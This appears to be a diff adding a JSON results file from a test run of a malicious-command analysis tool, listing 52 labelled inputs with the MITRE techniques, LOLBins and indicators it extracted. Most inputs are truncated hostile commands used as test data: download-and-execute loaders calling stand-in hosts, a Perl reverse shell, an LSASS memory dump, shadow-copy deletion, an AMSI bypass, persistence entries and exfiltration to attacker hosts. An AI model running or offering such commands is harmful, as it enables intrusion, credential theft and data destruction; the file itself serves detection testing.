@@ -1,0 +1,1187 @@
+{
+  "date": "2026-07-18",
+  "total": 52,
+  "elapsed_sec": 11.34,
+  "results": [
+    {
+      "n": 1,
+      "label": "A1 \u00b7 PS -EncodedCommand short",
+      "input_snippet": "powershell -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgAGgAZQBsAGwAbwA=",
+      "status": 200,
+      "engine": "archetype:PS_EncodedCommand",
+      "score": null,
+      "verdict": null,
+      "level": null,
+      "reached_shellcode": false,
+      "chain": [],
+      "mitre_count": 2,
+      "mitre_ids": [
+        "T1059.001",
+        "T1027.010"
+      ],
+      "lolbins": [
+        "powershell.exe"
+      ],
+      "iocs_urls": [],
+      "iocs_ips": [],
+      "output_len": 607
+    },
+    {
+      "n": 2,
+      "label": "A2 \u00b7 PS -Enc IEX DownloadString",
+      "input_snippet": "powershell -NoP -W Hidden -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0AC",
+      "status": 200,
+      "engine": "archetype:PS_EncodedCommand",
+      "score": null,
+      "verdict": null,
+      "level": null,
+      "reached_shellcode": false,
+      "chain": [],
+      "mitre_count": 4,
+      "mitre_ids": [
+        "T1059.001",
+        "T1027.010",
+        "T1105",
+        "T1566.001"
+      ],
+      "lolbins": [
+        "powershell.exe"
+      ],
+      "iocs_urls": [
+        "http://10.0.0.1/x.ps1"
+      ],
+      "iocs_ips": [
+        "10.0.0.1"
+      ],
+      "output_len": 800
+    },
+    {
+      "n": 3,
+      "label": "A3 \u00b7 PS -e DownloadFile+Start-Process",
+      "input_snippet": "powershell -e JAB3AD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQ",
+      "status": 200,
+      "engine": "archetype:PS_EncodedCommand",
+      "score": null,
+      "verdict": null,
+      "level": null,
+      "reached_shellcode": false,
+      "chain": [],
+      "mitre_count": 5,
+      "mitre_ids": [
+        "T1059.001",
+        "T1027.010",
+        "T1105",
+        "T1027",
+        "T1204.002"
+      ],
+      "lolbins": [
+        "powershell.exe"
+      ],
+      "iocs_urls": [
+        "http://evil/y.exe"
+      ],
+      "iocs_ips": [],
+      "output_len": 860
+    },
+    {
+      "n": 4,
+      "label": "A4 \u00b7 PS AMSI reflection short",
+      "input_snippet": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiI",
+      "status": 200,
+      "engine": "magic",
+      "score": null,
+      "verdict": null,
+      "level": null,
+      "reached_shellcode": false,
+      "chain": [],
+      "mitre_count": 0,
+      "mitre_ids": [],
+      "lolbins": [],
+      "iocs_urls": [],
+      "iocs_ips": [],
+      "output_len": 480
+    },
+    {
+      "n": 5,
+      "label": "A5 \u00b7 CMD /c PS chain",
+      "input_snippet": "cmd.exe /c \"powershell -w hidden -c IEX(New-Object Net.WebClient).DownloadString",
+      "status": 200,
+      "engine": "magic",
+      "score": null,
+      "verdict": null,
+      "level": null,
+      "reached_shellcode": false,
+      "chain": [],
+      "mitre_count": 4,
+      "mitre_ids": [
+        "T1059.003",
+        "T1105",
+        "T1059.001",
+        "T1566.001"
+      ],
+      "lolbins": [
+        "powershell.exe",
+        "cmd.exe"
+      ],
+      "iocs_urls": [
+        "http://x/y.ps1"
+      ],
+      "iocs_ips": [],
+      "output_len": 669
+    },
+    {
+      "n": 6,
+      "label": "B1 \u00b7 b64 \u2192 utf16le \u2192 PS concat AMSI",
+      "input_snippet": "powershell -Enc UwBgAGUAVAAtAEkAdABgAGUAbQAoACcAVgAnACsAJwBhAFIAJwApACgAKAAnAEEA",
+      "status": 200,
+      "engine": "archetype:PS_EncodedCommand",
+      "score": null,
+      "verdict": null,
+      "level": null,
+      "reached_shellcode": false,
+      "chain": [],
+      "mitre_count": 2,
+      "mitre_ids": [
+        "T1059.001",
+        "T1027.010"
+      ],
+      "lolbins": [
+        "powershell.exe",
+        "curl.exe"
+      ],
+      "iocs_urls": [
+        "https://10.2.27.30"
+      ],
+      "iocs_ips": [
+        "10.2.27.30"
+      ],
+      "output_len": 714
+    },
+    {
+      "n": 7,
+      "label": "B2 \u00b7 b64 \u2192 gzip \u2192 shell curl",
+      "input_snippet": "echo 'H4sIAMRjW2oC/0suLcpR0E0rDvZRyCgpKbDS16/Qy8wHEsUZCjUKSYnFGQDBGOWIIgAAAA==' ",
+      "status": 200,
+      "engine": "archetype:Bash_base64_gunzip_pipe+BASH_WGET_FLOCK_BACKGROUND",
+      "score": null,
+      "verdict": null,
+      "level": null,
+      "reached_shellcode": false,
+      "chain": [],
+      "mitre_count": 1,
+      "mitre_ids": [
+        "T1105"
+      ],
+      "lolbins": [
+        "curl.exe",
+        "Bash.exe"
+      ],
+      "iocs_urls": [
+        "http://x.io/x.sh"
+      ],
+      "iocs_ips": [],
+      "output_len": 1045
+    },
+    {
+      "n": 8,
+      "label": "B3 \u00b7 CS byte-array shellcode loader",
+      "input_snippet": "[Byte[]]$var_code=[System.Convert]::FromBase64String('QUFBQUFBQUFBQUFBQUFBQUFBQU",
+      "status": 200,
+      "engine": "magic+archetype:BLIND_XOR_SINGLE_BYTE",
+      "score": null,
+      "verdict": null,
+      "level": null,
+      "reached_shellcode": false,
+      "chain": [],
+      "mitre_count": 5,
+      "mitre_ids": [
+        "T1140",
+        "T1027",
+        "T1055",
+        "T1620",
+        "T1055.002"
+      ],
+      "lolbins": [],
+      "iocs_urls": [],
+      "iocs_ips": [],
+      "output_len": 1170
+    },
+    {
+      "n": 9,
+      "label": "B4 \u00b7 Nested b64 double-wrap",
+      "input_snippet": "powershell -Enc cABvAHcAZQByAHMAaABlAGwAbAAgAC0ARQBuAGMAIABWAHcAQgB5AEEARwBrAEEA",
+      "status": 200,
+      "engine": "archetype:PS_EncodedCommand",
+      "score": null,
+      "verdict": null,
+      "level": null,
+      "reached_shellcode": false,
+      "chain": [],
+      "mitre_count": 2,
+      "mitre_ids": [
+        "T1059.001",
+        "T1027.010"
+      ],
+      "lolbins": [
+        "powershell.exe"
+      ],
+      "iocs_urls": [],
+      "iocs_ips": [],
+      "output_len": 646
+    },
+    {
+      "n": 10,
+      "label": "B5 \u00b7 Bash flock + wget + b64",
+      "input_snippet": "( flock -x 200; wget -qO- http://x.io/loader | base64 -d | bash ) 200>/tmp/l.loc",
+      "status": 200,
+      "engine": "magic",
+      "score": null,
+      "verdict": null,
+      "level": null,
+      "reached_shellcode": false,
+      "chain": [],
+      "mitre_count": 3,
+      "mitre_ids": [
+        "T1105",
+        "T1059.004",
+        "T1027.010"
+      ],
+      "lolbins": [
+        "Bash.exe"
+      ],
+      "iocs_urls": [
+        "http://x.io/loader"
+      ],
+      "iocs_ips": [],
+      "output_len": 633
+    },
+    {
+      "n": 11,
+      "label": "B6 \u00b7 CMD\u2192PS\u2192IEX\u2192download\u2192exec",
+      "input_snippet": "cmd /c powershell -nop -w hidden -c \"IEX ((New-Object Net.WebClient).DownloadStr",
+      "status": 200,
+      "engine": "smart",
+      "score": null,
+      "verdict": null,
+      "level": null,
+      "reached_shellcode": false,
+      "chain": [],
+      "mitre_count": 7,
+      "mitre_ids": [
+        "T1059.003",
+        "T1105",
+        "T1059.001",
+        "T1082",
+        "T1204.002",
+        "T1074.001",
+        "T1566.001"
+      ],
+      "lolbins": [
+        "powershell.exe",
+        "cmd.exe"
+      ],
+      "iocs_urls": [
+        "http://a/b.ps1"
+      ],
+      "iocs_ips": [],
+      "output_len": 989
+    },
+    {
+      "n": 12,
+      "label": "B7 \u00b7 PS bxor loop XOR",
+      "input_snippet": "$s=[Convert]::FromBase64String('AAAA'); for($i=0;$i-lt$s.Length;$i++){$s[$i]=$s[",
+      "status": 200,
+      "engine": "magic",
+      "score": null,
+      "verdict": null,
+      "level": null,
+      "reached_shellcode": false,
+      "chain": [],
+      "mitre_count": 2,
+      "mitre_ids": [
+        "T1140",
+        "T1027.013"
+      ],
+      "lolbins": [],
+      "iocs_urls": [],
+      "iocs_ips": [],
+      "output_len": 528
+    },
+    {
+      "n": 13,
+      "label": "B8 \u00b7 PS char-code assembly",
+      "input_snippet": "-join(([char[]](116,101,115,116)))",
+      "status": 200,
+      "engine": "archetype:PS_CHAR_ARRAY_JOIN_DECODE",
+      "score": null,
+      "verdict": null,
+      "level": null,
+      "reached_shellcode": false,
+      "chain": [],
+      "mitre_count": 0,
+      "mitre_ids": [],
+      "lolbins": [],
+      "iocs_urls": [],
+      "iocs_ips": [],
+      "output_len": 426
+    },
+    {
+      "n": 14,
+      "label": "C1 \u00b7 Fragment -EncodedCommand",
+      "input_snippet": "-EncodedCommand RwBlAHQALQBQAHIAbwBjAGUAcwBzAA==",
+      "status": 200,
+      "engine": "magic",
+      "score": null,
+      "verdict": null,
+      "level": null,
+      "reached_shellcode": false,
+      "chain": [],
+      "mitre_count": 1,
+      "mitre_ids": [
+        "T1059.001"
+      ],
+      "lolbins": [],
+      "iocs_urls": [],
+      "iocs_ips": [],
+      "output_len": 481
+    },
+    {
+      "n": 15,
+      "label": "C2 \u00b7 Fragment /c rundll32 comsvcs",
+      "input_snippet": "/Q /c \"for /f %A in ('tasklist') do rundll32.exe C:\\Windows\\System32\\comsvcs.dll",
+      "status": 200,
+      "engine": "magic",
+      "score": null,
+      "verdict": null,
+      "level": null,
+      "reached_shellcode": false,
+      "chain": [],
+      "mitre_count": 4,
+      "mitre_ids": [
+        "T1218.011",
+        "T1057",
+        "T1059.003",
+        "T1003.001"
+      ],
+      "lolbins": [
+        "rundll32.exe",
+        "Comsvcs.dll"
+      ],
+      "iocs_urls": [],
+      "iocs_ips": [],
+      "output_len": 554
+    },
+    {
+      "n": 16,
+      "label": "C3 \u00b7 Fragment certutil -urlcache",
+      "input_snippet": "-urlcache -split -f http://evil/x.exe C:\\Users\\Public\\x.exe",
+      "status": 200,
+      "engine": "reasoning",
+      "score": null,
+      "verdict": null,
+      "level": null,
+      "reached_shellcode": false,
+      "chain": [],
+      "mitre_count": 1,
+      "mitre_ids": [
+        "T1105"
+      ],
+      "lolbins": [],
+      "iocs_urls": [
+        "http://evil/x.exe"
+      ],
+      "iocs_ips": [],
+      "output_len": 575
+    },
+    {
+      "n": 17,
+      "label": "C4 \u00b7 Fragment bitsadmin transfer",
+      "input_snippet": "/transfer job http://evil/loader.exe C:\\Windows\\Temp\\l.exe",
+      "status": 200,
+      "engine": "magic",
+      "score": null,
+      "verdict": null,
+      "level": null,
+      "reached_shellcode": false,
+      "chain": [],
+      "mitre_count": 2,
+      "mitre_ids": [
+        "T1197",
+        "T1074.001"
+      ],
+      "lolbins": [],
+      "iocs_urls": [
+        "http://evil/loader.exe"
+      ],
+      "iocs_ips": [],
+      "output_len": 496
+    },
+    {
+      "n": 18,
+      "label": "C5 \u00b7 Fragment schtasks",
+      "input_snippet": "/create /tn Updater /tr \"C:\\Users\\Public\\p.exe\" /sc onlogon",
+      "status": 200,
+      "engine": "magic",
+      "score": null,
+      "verdict": null,
+      "level": null,
+      "reached_shellcode": false,
+      "chain": [],
+      "mitre_count": 1,
+      "mitre_ids": [
+        "T1053.005"
+      ],
+      "lolbins": [],
+      "iocs_urls": [],
+      "iocs_ips": [],
+      "output_len": 413
+    },
+    {
+      "n": 19,
+      "label": "C6 \u00b7 Fragment reg run key",
+      "input_snippet": "add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Upd /d C:\\p.exe /f",
+      "status": 200,
+      "engine": "magic",
+      "score": null,
+      "verdict": null,
+      "level": null,
+      "reached_shellcode": false,
+      "chain": [],
+      "mitre_count": 1,
+      "mitre_ids": [
+        "T1547.001"
+      ],
+      "lolbins": [],
+      "iocs_urls": [],
+      "iocs_ips": [],
+      "output_len": 413
+    },
+    {
+      "n": 20,
+      "label": "C7 \u00b7 Fragment vssadmin",
+      "input_snippet": "delete shadows /all /quiet",
+      "status": 200,
+      "engine": "magic",
+      "score": null,
+      "verdict": null,
+      "level": null,
+      "reached_shellcode": false,
+      "chain": [],
+      "mitre_count": 1,
+      "mitre_ids": [
+        "T1490"
+      ],
+      "lolbins": [],
+      "iocs_urls": [],
+      "iocs_ips": [],
+      "output_len": 408
+    },
+    {
+      "n": 21,
+      "label": "C8 \u00b7 Fragment comsvcs ordinal",
+      "input_snippet": "C:\\Windows\\System32\\comsvcs.dll, #+000024 1076 \\Windows\\Temp\\m.dmp full",
+      "status": 200,
+      "engine": "magic",
+      "score": null,
+      "verdict": null,
+      "level": null,
+      "reached_shellcode": false,
+      "chain": [],
+      "mitre_count": 3,
+      "mitre_ids": [
+        "T1218.011",
+        "T1003.001",
+        "T1074.001"
+      ],
+      "lolbins": [
+        "Comsvcs.dll"
+      ],
+      "iocs_urls": [],
+      "iocs_ips": [],
+      "output_len": 512
+    },
+    {
+      "n": 22,
+      "label": "D1 \u00b7 Linux curl | bash",
+      "input_snippet": "curl -fsSL http://x/y.sh | bash",
+      "status": 200,
+      "engine": "archetype:BASH_WGET_FLOCK_BACKGROUND",
+      "score": null,
+      "verdict": null,
+      "level": null,
+      "reached_shellcode": false,
+      "chain": [],
+      "mitre_count": 1,
+      "mitre_ids": [
+        "T1105"
+      ],
+      "lolbins": [
+        "curl.exe",
+        "Bash.exe"
+      ],
+      "iocs_urls": [
+        "http://x/y.sh"
+      ],
+      "iocs_ips": [],
+      "output_len": 965
+    },
+    {
+      "n": 23,
+      "label": "D2 \u00b7 Linux wget | sh",
+      "input_snippet": "wget -qO- http://x/y.sh | sh",
+      "status": 200,
+      "engine": "archetype:BASH_WGET_FLOCK_BACKGROUND",
+      "score": null,
+      "verdict": null,
+      "level": null,
+      "reached_shellcode": false,
+      "chain": [],
+      "mitre_count": 1,
+      "mitre_ids": [
+        "T1105"
+      ],
+      "lolbins": [],
+      "iocs_urls": [
+        "http://x/y.sh"
+      ],
+      "iocs_ips": [],
+      "output_len": 927
+    },
+    {
+      "n": 24,
+      "label": "D3 \u00b7 Linux nohup bg",
+      "input_snippet": "nohup /tmp/x >/dev/null 2>&1 &",
+      "status": 200,
+      "engine": "reasoning",
+      "score": null,
+      "verdict": null,
+      "level": null,
+      "reached_shellcode": false,
+      "chain": [],
+      "mitre_count": 0,
+      "mitre_ids": [],
+      "lolbins": [],
+      "iocs_urls": [],
+      "iocs_ips": [],
+      "output_len": 388
+    },
+    {
+      "n": 25,
+      "label": "D4 \u00b7 Linux crontab persistence",
+      "input_snippet": "(crontab -l 2>/dev/null; echo '*/5 * * * * /tmp/x.sh') | crontab -",
+      "status": 200,
+      "engine": "reasoning",
+      "score": null,
+      "verdict": null,
+      "level": null,
+      "reached_shellcode": false,
+      "chain": [],
+      "mitre_count": 1,
+      "mitre_ids": [
+        "T1053.003"
+      ],
+      "lolbins": [],
+      "iocs_urls": [],
+      "iocs_ips": [],
+      "output_len": 498
+    },
+    {
+      "n": 26,
+      "label": "D5 \u00b7 macOS osascript loader",
+      "input_snippet": "osascript -e 'do shell script \"curl http://x/y.sh | bash\"'",
+      "status": 200,
+      "engine": "archetype:MACOS_OSASCRIPT_DO_SHELL+BASH_WGET_FLOCK_BACKGROUND",
+      "score": null,
+      "verdict": null,
+      "level": null,
+      "reached_shellcode": false,
+      "chain": [],
+      "mitre_count": 2,
+      "mitre_ids": [
+        "T1105",
+        "T1059.002"
+      ],
+      "lolbins": [
+        "curl.exe"
+      ],
+      "iocs_urls": [
+        "http://x/y.sh"
+      ],
+      "iocs_ips": [],
+      "output_len": 1391
+    },
+    {
+      "n": 27,
+      "label": "D6 \u00b7 macOS LaunchAgent load",
+      "input_snippet": "launchctl load ~/Library/LaunchAgents/com.evil.updater.plist",
+      "status": 200,
+      "engine": "smart+magic",
+      "score": null,
+      "verdict": null,
+      "level": null,
+      "reached_shellcode": false,
+      "chain": [],
+      "mitre_count": 1,
+      "mitre_ids": [
+        "T1543.001"
+      ],
+      "lolbins": [],
+      "iocs_urls": [],
+      "iocs_ips": [],
+      "output_len": 480
+    },
+    {
+      "n": 28,
+      "label": "D7 \u00b7 Python b64 exec",
+      "input_snippet": "python -c \"import base64;exec(base64.b64decode('aW1wb3J0IG9zO29zLnN5c3RlbSgnaWQn",
+      "status": 200,
+      "engine": "smart",
+      "score": null,
+      "verdict": null,
+      "level": null,
+      "reached_shellcode": false,
+      "chain": [],
+      "mitre_count": 1,
+      "mitre_ids": [
+        "T1027.010"
+      ],
+      "lolbins": [],
+      "iocs_urls": [],
+      "iocs_ips": [],
+      "output_len": 458
+    },
+    {
+      "n": 29,
+      "label": "D8 \u00b7 Perl reverse shell",
+      "input_snippet": "perl -e 'use Socket;$i=\"1.2.3.4\";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyn",
+      "status": 200,
+      "engine": "magic",
+      "score": null,
+      "verdict": null,
+      "level": null,
+      "reached_shellcode": false,
+      "chain": [],
+      "mitre_count": 1,
+      "mitre_ids": [
+        "T1059.006"
+      ],
+      "lolbins": [],
+      "iocs_urls": [],
+      "iocs_ips": [
+        "1.2.3.4",
+        "4.3.2.1"
+      ],
+      "output_len": 463
+    },
+    {
+      "n": 30,
+      "label": "E1 \u00b7 certutil download",
+      "input_snippet": "certutil.exe -urlcache -split -f https://evil/x.exe %TEMP%\\x.exe",
+      "status": 200,
+      "engine": "archetype:CERTUTIL_DOWNLOAD_DECODE_WORKFLOW+smart",
+      "score": null,
+      "verdict": null,
+      "level": null,
+      "reached_shellcode": false,
+      "chain": [],
+      "mitre_count": 2,
+      "mitre_ids": [
+        "T1105",
+        "T1074.001"
+      ],
+      "lolbins": [
+        "certutil.exe"
+      ],
+      "iocs_urls": [
+        "https://evil/x.exe"
+      ],
+      "iocs_ips": [],
+      "output_len": 839
+    },
+    {
+      "n": 31,
+      "label": "E2 \u00b7 mshta remote",
+      "input_snippet": "mshta.exe http://evil/x.hta",
+      "status": 200,
+      "engine": "archetype:LOLBAS_MSHTA_LOADER",
+      "score": null,
+      "verdict": null,
+      "level": null,
+      "reached_shellcode": false,
+      "chain": [],
+      "mitre_count": 2,
+      "mitre_ids": [
+        "T1218.005",
+        "T1566.001"
+      ],
+      "lolbins": [
+        "mshta.exe"
+      ],
+      "iocs_urls": [
+        "http://evil/x.hta"
+      ],
+      "iocs_ips": [],
+      "output_len": 690
+    },
+    {
+      "n": 32,
+      "label": "E3 \u00b7 rundll32 JS",
+      "input_snippet": "rundll32.exe javascript:document.write('load')",
+      "status": 200,
+      "engine": "reasoning",
+      "score": null,
+      "verdict": null,
+      "level": null,
+      "reached_shellcode": false,
+      "chain": [],
+      "mitre_count": 1,
+      "mitre_ids": [
+        "T1218.011"
+      ],
+      "lolbins": [
+        "rundll32.exe"
+      ],
+      "iocs_urls": [],
+      "iocs_ips": [],
+      "output_len": 484
+    },
+    {
+      "n": 33,
+      "label": "E4 \u00b7 regsvr32 SCT",
+      "input_snippet": "regsvr32.exe /s /n /u /i:http://evil/xxx.sct scrobj.dll",
+      "status": 200,
+      "engine": "archetype:LOLBAS_REGSVR32_SCRIPTLET",
+      "score": null,
+      "verdict": null,
+      "level": null,
+      "reached_shellcode": false,
+      "chain": [],
+      "mitre_count": 2,
+      "mitre_ids": [
+        "T1218.010",
+        "T1105"
+      ],
+      "lolbins": [
+        "regsvr32.exe",
+        "Scrobj.dll"
+      ],
+      "iocs_urls": [
+        "http://evil/xxx.sct"
+      ],
+      "iocs_ips": [],
+      "output_len": 839
+    },
+    {
+      "n": 34,
+      "label": "E5 \u00b7 InstallUtil",
+      "input_snippet": "InstallUtil.exe /logfile= /LogToConsole=false /U C:\\payload.dll",
+      "status": 200,
+      "engine": "magic",
+      "score": null,
+      "verdict": null,
+      "level": null,
+      "reached_shellcode": false,
+      "chain": [],
+      "mitre_count": 1,
+      "mitre_ids": [
+        "T1218.004"
+      ],
+      "lolbins": [
+        "installutil.exe"
+      ],
+      "iocs_urls": [],
+      "iocs_ips": [],
+      "output_len": 449
+    },
+    {
+      "n": 35,
+      "label": "E6 \u00b7 Msbuild inline",
+      "input_snippet": "msbuild.exe C:\\Users\\Public\\evil.csproj",
+      "status": 200,
+      "engine": "magic",
+      "score": null,
+      "verdict": null,
+      "level": null,
+      "reached_shellcode": false,
+      "chain": [],
+      "mitre_count": 0,
+      "mitre_ids": [],
+      "lolbins": [
+        "msbuild.exe"
+      ],
+      "iocs_urls": [],
+      "iocs_ips": [],
+      "output_len": 394
+    },
+    {
+      "n": 36,
+      "label": "E7 \u00b7 Bitsadmin",
+      "input_snippet": "bitsadmin /transfer myJob /download http://evil/x.exe C:\\x.exe",
+      "status": 200,
+      "engine": "archetype:LOLBAS_BITSADMIN_TRANSFER",
+      "score": null,
+      "verdict": null,
+      "level": null,
+      "reached_shellcode": false,
+      "chain": [],
+      "mitre_count": 2,
+      "mitre_ids": [
+        "T1197",
+        "T1105"
+      ],
+      "lolbins": [
+        "bitsadmin.exe"
+      ],
+      "iocs_urls": [
+        "http://evil/x.exe"
+      ],
+      "iocs_ips": [],
+      "output_len": 814
+    },
+    {
+      "n": 37,
+      "label": "E8 \u00b7 Wmic remote spawn",
+      "input_snippet": "wmic /node:\"192.168.1.10\" process call create \"powershell -c IEX\"",
+      "status": 200,
+      "engine": "archetype:LOLBAS_WMIC_PROCESS_CALL+smart",
+      "score": null,
+      "verdict": null,
+      "level": null,
+      "reached_shellcode": false,
+      "chain": [],
+      "mitre_count": 2,
+      "mitre_ids": [
+        "T1047",
+        "T1059.001"
+      ],
+      "lolbins": [
+        "wmic.exe",
+        "powershell.exe"
+      ],
+      "iocs_urls": [],
+      "iocs_ips": [
+        "192.168.1.10",
+        "01.1.861.291"
+      ],
+      "output_len": 686
+    },
+    {
+      "n": 38,
+      "label": "F1 \u00b7 Impact ransomware precursor",
+      "input_snippet": "vssadmin delete shadows /all /quiet & wbadmin delete catalog -quiet & wevtutil c",
+      "status": 200,
+      "engine": "archetype:NATIVE_CMD_EXPLAINER",
+      "score": null,
+      "verdict": null,
+      "level": null,
+      "reached_shellcode": false,
+      "chain": [],
+      "mitre_count": 2,
+      "mitre_ids": [
+        "T1070.001",
+        "T1490"
+      ],
+      "lolbins": [
+        "vssadmin.exe",
+        "wbadmin.exe",
+        "wevtutil.exe"
+      ],
+      "iocs_urls": [],
+      "iocs_ips": [],
+      "output_len": 1032
+    },
+    {
+      "n": 39,
+      "label": "F2 \u00b7 Lateral PsExec SMB",
+      "input_snippet": "psexec.exe \\\\FILESRV -s cmd.exe /c \"copy evil.exe \\\\FILESRV\\C$\\Windows\\Temp\\\"",
+      "status": 200,
+      "engine": "magic",
+      "score": null,
+      "verdict": null,
+      "level": null,
+      "reached_shellcode": false,
+      "chain": [],
+      "mitre_count": 4,
+      "mitre_ids": [
+        "T1059.003",
+        "T1021.002",
+        "T1074.001",
+        "T1570"
+      ],
+      "lolbins": [
+        "cmd.exe"
+      ],
+      "iocs_urls": [],
+      "iocs_ips": [],
+      "output_len": 537
+    },
+    {
+      "n": 40,
+      "label": "F3 \u00b7 Exfil IWR POST",
+      "input_snippet": "Invoke-WebRequest -Uri http://exfil.example/upload -Method POST -InFile C:\\loot.",
+      "status": 200,
+      "engine": "magic",
+      "score": null,
+      "verdict": null,
+      "level": null,
+      "reached_shellcode": false,
+      "chain": [],
+      "mitre_count": 3,
+      "mitre_ids": [
+        "T1105",
+        "T1059.001",
+        "T1041"
+      ],
+      "lolbins": [],
+      "iocs_urls": [
+        "http://exfil.example/upload"
+      ],
+      "iocs_ips": [],
+      "output_len": 639
+    },
+    {
+      "n": 41,
+      "label": "F4 \u00b7 Exfil aws s3 cp",
+      "input_snippet": "aws s3 cp secrets.tar.gz s3://attacker-bucket/loot/",
+      "status": 200,
+      "engine": "reasoning",
+      "score": null,
+      "verdict": null,
+      "level": null,
+      "reached_shellcode": false,
+      "chain": [],
+      "mitre_count": 2,
+      "mitre_ids": [
+        "T1526",
+        "T1567.002"
+      ],
+      "lolbins": [],
+      "iocs_urls": [],
+      "iocs_ips": [],
+      "output_len": 494
+    },
+    {
+      "n": 42,
+      "label": "F5 \u00b7 Collection archive + IWR",
+      "input_snippet": "Compress-Archive -Path C:\\Users\\*\\Documents -DestinationPath loot.zip; iwr -Uri ",
+      "status": 200,
+      "engine": "reasoning+magic",
+      "score": null,
+      "verdict": null,
+      "level": null,
+      "reached_shellcode": false,
+      "chain": [],
+      "mitre_count": 3,
+      "mitre_ids": [
+        "T1105",
+        "T1059.001",
+        "T1560.001"
+      ],
+      "lolbins": [],
+      "iocs_urls": [],
+      "iocs_ips": [],
+      "output_len": 687
+    },
+    {
+      "n": 43,
+      "label": "F6 \u00b7 Collection clipboard",
+      "input_snippet": "Get-Clipboard | Out-File $env:TEMP\\clip.txt",
+      "status": 200,
+      "engine": "magic",
+      "score": null,
+      "verdict": null,
+      "level": null,
+      "reached_shellcode": false,
+      "chain": [],
+      "mitre_count": 2,
+      "mitre_ids": [
+        "T1082",
+        "T1115"
+      ],
+      "lolbins": [],
+      "iocs_urls": [],
+      "iocs_ips": [],
+      "output_len": 441
+    },
+    {
+      "n": 44,
+      "label": "F7 \u00b7 Exfil DNS tunnel",
+      "input_snippet": "nslookup aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.exfil.example.com",
+      "status": 200,
+      "engine": "magic+archetype:BLIND_XOR_SINGLE_BYTE",
+      "score": null,
+      "verdict": null,
+      "level": null,
+      "reached_shellcode": false,
+      "chain": [],
+      "mitre_count": 2,
+      "mitre_ids": [
+        "T1071.004",
+        "T1048.003"
+      ],
+      "lolbins": [],
+      "iocs_urls": [],
+      "iocs_ips": [],
+      "output_len": 948
+    },
+    {
+      "n": 45,
+      "label": "G1 \u00b7 GCP svc-account JWT",
+      "input_snippet": "eyJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJzdmMtYWNjb3VudEBteS1wcm9qZWN0LmlhbS5nc2VydmljZWF",
+      "status": 200,
+      "engine": "magic",
+      "score": null,
+      "verdict": null,
+      "level": null,
+      "reached_shellcode": false,
+      "chain": [],
+      "mitre_count": 0,
+      "mitre_ids": [],
+      "lolbins": [],
+      "iocs_urls": [
+        "https://www.googleapis.com/auth/cloud-platform"
+      ],
+      "iocs_ips": [],
+      "output_len": 785
+    },
+    {
+      "n": 46,
+      "label": "G2 \u00b7 AWS Cognito ID token",
+      "input_snippet": "eyJraWQiOiJmZDU3IiwiYWxnIjoiUlMyNTYifQ.eyJjb2duaXRvOnVzZXJuYW1lIjoidmljdGltQHRhc",
+      "status": 200,
+      "engine": "reasoning",
+      "score": null,
+      "verdict": null,
+      "level": null,
+      "reached_shellcode": false,
+      "chain": [],
+      "mitre_count": 0,
+      "mitre_ids": [],
+      "lolbins": [],
+      "iocs_urls": [],
+      "iocs_ips": [],
+      "output_len": 457
+    },
+    {
+      "n": 47,
+      "label": "G3 \u00b7 Ngrok tunnel C2",
+      "input_snippet": "ssh -R 22:localhost:22 tunnel@1.tcp.ngrok.io -p 12345 -N",
+      "status": 200,
+      "engine": "magic",
+      "score": null,
+      "verdict": null,
+      "level": null,
+      "reached_shellcode": false,
+      "chain": [],
+      "mitre_count": 2,
+      "mitre_ids": [
+        "T1021.004",
+        "T1090.002"
+      ],
+      "lolbins": [
+        "ssh.exe"
+      ],
+      "iocs_urls": [],
+      "iocs_ips": [],
+      "output_len": 554
+    },
+    {
+      "n": 48,
+      "label": "G4 \u00b7 ClickFix Azure Blob",
+      "input_snippet": "powershell -w h -c \"iwr http://legit.blob.core.windows.net/tools/updater.ps1 -Us",
+      "status": 200,
+      "engine": "magic",
+      "score": null,
+      "verdict": null,
+      "level": null,
+      "reached_shellcode": false,
+      "chain": [],
+      "mitre_count": 3,
+      "mitre_ids": [
+        "T1105",
+        "T1059.001",
+        "T1566.001"
+      ],
+      "lolbins": [
+        "powershell.exe"
+      ],
+      "iocs_urls": [
+        "http://legit.blob.core.windows.net/tools/updater.ps1"
+      ],
+      "iocs_ips": [],
+      "output_len": 711
+    },
+    {
+      "n": 49,
+      "label": "H1 \u00b7 Benign hostname",
+      "input_snippet": "WIN10-DEV-42",
+      "status": 200,
+      "engine": "magic",
+      "score": null,
+      "verdict": null,
+      "level": null,
+      "reached_shellcode": false,
+      "chain": [],
+      "mitre_count": 0,
+      "mitre_ids": [],
+      "lolbins": [],
+      "iocs_urls": [],
+      "iocs_ips": [],
+      "output_len": 366
+    },
+    {
+      "n": 50,
+      "label": "H2 \u00b7 Benign echo",
+      "input_snippet": "echo Hello World",
+      "status": 200,
+      "engine": "magic",
+      "score": null,
+      "verdict": null,
+      "level": null,
+      "reached_shellcode": false,
+      "chain": [],
+      "mitre_count": 0,
+      "mitre_ids": [],
+      "lolbins": [],
+      "iocs_urls": [],
+      "iocs_ips": [],
+      "output_len": 366
+    },
+    {
+      "n": 51,
+      "label": "H3 \u00b7 Benign var assignment",
+      "input_snippet": "$x = 'production'",
+      "status": 200,
+      "engine": "reasoning",
+      "score": null,
+      "verdict": null,
+      "level": null,
+      "reached_shellcode": false,
+      "chain": [],
+      "mitre_count": 0,
+      "mitre_ids": [],
+      "lolbins": [],
+      "iocs_urls": [],
+      "iocs_ips": [],
+      "output_len": 375
+    },
+    {
+      "n": 52,
+      "label": "H4 \u00b7 JSON debris",
+      "input_snippet": "],",
+      "status": 200,
+      "engine": "magic",
+      "score": null,
+      "verdict": null,
+      "level": null,
+      "reached_shellcode": false,
+      "chain": [],
+      "mitre_count": 0,
+      "mitre_ids": [],
+      "lolbins": [],
+      "iocs_urls": [],
+      "iocs_ips": [],
+      "output_len": 366
+    }
+  ]
+}
